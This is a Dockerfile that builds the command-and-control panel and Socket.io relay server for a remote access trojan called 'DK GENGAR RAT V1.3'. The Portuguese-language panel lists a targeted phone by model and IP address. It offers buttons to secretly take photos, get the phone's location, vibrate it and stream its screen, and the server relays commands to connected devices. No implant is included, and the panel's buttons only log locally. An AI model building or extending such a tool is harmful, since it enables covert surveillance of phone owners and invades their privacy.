# Dockerfile para DK GENGAR RAT V1.3 (Infiltrated Edition)
FROM node:18-slim

WORKDIR /app

# Criando um servidor Socket.io de exemplo com o painel embutido
RUN npm init -y && npm install socket.io express

COPY . .

# Criando o arquivo index.html atualizado (V1.3)
RUN echo '<!DOCTYPE html>\
<html lang="pt-br">\
<head>\
    <meta charset="UTF-8">\
    <meta name="viewport" content="width=device-width, initial-scale=1.0">\
    <title>DK GENGAR RAT - V1.3</title>\
    <style>\
        :root {\
            --roxo-sombrio: #1a0033;\
            --verde-neon: #39ff14;\
            --preto-profundo: #0a0a0a;\
        }\
        body {\
            background-color: var(--roxo-sombrio);\
            color: var(--verde-neon);\
            font-family: "Courier New", Courier, monospace;\
            margin: 0;\
            display: flex;\
            height: 100vh;\
        }\
        #sidebar {\
            width: 250px;\
            background-color: var(--preto-profundo);\
            border-right: 2px solid var(--verde-neon);\
            padding: 20px;\
        }\
        #main-content {\
            flex: 1;\
            padding: 30px;\
            overflow-y: auto;\
        }\
        .card {\
            background: rgba(0, 0, 0, 0.7);\
            border: 1px solid var(--verde-neon);\
            padding: 20px;\
            border-radius: 10px;\
            margin-bottom: 20px;\
            box-shadow: 0 0 15px rgba(57, 255, 20, 0.2);\
        }\
        .btn {\
            background: transparent;\
            border: 1px solid var(--verde-neon);\
            color: var(--verde-neon);\
            padding: 10px 20px;\
            cursor: pointer;\
            text-transform: uppercase;\
            font-weight: bold;\
            margin: 5px;\
            transition: 0.3s;\
        }\
        .btn:hover {\
            background: var(--verde-neon);\
            color: var(--roxo-sombrio);\
        }\
        .btn-live {\
            border-color: #ff0055;\
            color: #ff0055;\
        }\
        .btn-live:hover {\
            background: #ff0055;\
            color: white;\
        }\
        #log-terminal {\
            background: #000;\
            height: 200px;\
            overflow-y: scroll;\
            padding: 10px;\
            font-size: 12px;\
            border: 1px solid #333;\
        }\
        .watermark {\
            position: fixed;\
            bottom: 20px;\
            right: 20px;\
            opacity: 0.3;\
            font-size: 14px;\
        }\
        #live-screen-container {\
            width: 100%;\
            max-width: 400px;\
            height: 700px;\
            border: 2px solid var(--verde-neon);\
            background: #000;\
            margin-top: 10px;\
            display: flex;\
            align-items: center;\
            justify-content: center;\
        }\
    </style>\
</head>\
<body>\
    <div id="sidebar">\
        <h2>DK GENGAR RAT</h2>\
        <p>Status: <span style="color:var(--verde-neon)">ONLINE</span></p>\
        <hr border="1" color="#39ff14">\
        <div id="device-list">\
            <div style="padding:10px; border:1px solid var(--verde-neon); margin-bottom:5px; cursor:pointer">\
                <strong>MOTO G22</strong><br>\
                <small>186.208.86.186</small>\
            </div>\
        </div>\
    </div>\
    <div id="main-content">\
        <div class="card">\
            <h3>CONTROLE ATIVO: MOTO G22</h3>\
            <button class="btn" onclick="sendCommand(\'TAKE_PHOTO\')">📷 TIRAR FOTO</button>\
            <button class="btn" onclick="sendCommand(\'GET_LOCATION\')">📍 LOCALIZAÇÃO</button>\
            <button class="btn" onclick="sendCommand(\'VIBRATE\')">📳 VIBRAR</button>\
            <button class="btn btn-live" onclick="toggleLive()">🔴 TELA AO VIVO</button>\
        </div>\
        <div style="display:flex; gap:20px">\
            <div class="card" style="flex:1">\
                <h3>TERMINAL DE LOGS</h3>\
                <div id="log-terminal">\
                    [14:39:03] DK GENGAR RAT - Sistema Online<br>\
                    [14:41:32] Conexão estabelecida com moto g22<br>\
                    [14:52:10] >>> Versão 1.3 (Infiltrated) Detectada<br>\
                </div>\
            </div>\
            <div class="card" style="flex:1">\
                <h3>PREVIEW DE TELA</h3>\
                <div id="live-screen-container">\
                    <span id="live-status">AGUARDANDO CONEXÃO...</span>\
                    <img id="live-img" style="display:none; width:100%; height:100%; object-fit:contain" />\
                </div>\
            </div>\
        </div>\
    </div>\
    <div class="watermark">Powered by DK | V1.3 Signature Edition</div>\
    <script>\
        function sendCommand(cmd) {\
            const log = document.getElementById("log-terminal");\
            log.innerHTML += `[${new Date().toLocaleTimeString()}] Enviando comando: ${cmd}<br>`;\
            log.scrollTop = log.scrollHeight;\
        }\
        function toggleLive() {\
            const status = document.getElementById("live-status");\
            status.innerHTML = "INICIANDO STREAM...";\
            sendCommand("START_SCREEN_STREAM");\
        }\
    </script>\
</body>\
</html>" > index.html

EXPOSE 8080

CMD ["node", "-e", "const fs=require(\"fs\"),http=require(\"http\"),io=require(\"socket.io\")(http.createServer((req,res)=>{res.writeHead(200,{\"Content-Type\":\"text/html\"});res.end(fs.readFileSync(\"index.html\"))}).listen(8080));io.on(\"connection\",s=>{console.log(\"New connection\");s.on(\"command\",c=>io.emit(\"command\",c))});console.log(\"Server running on port 8080\")"]
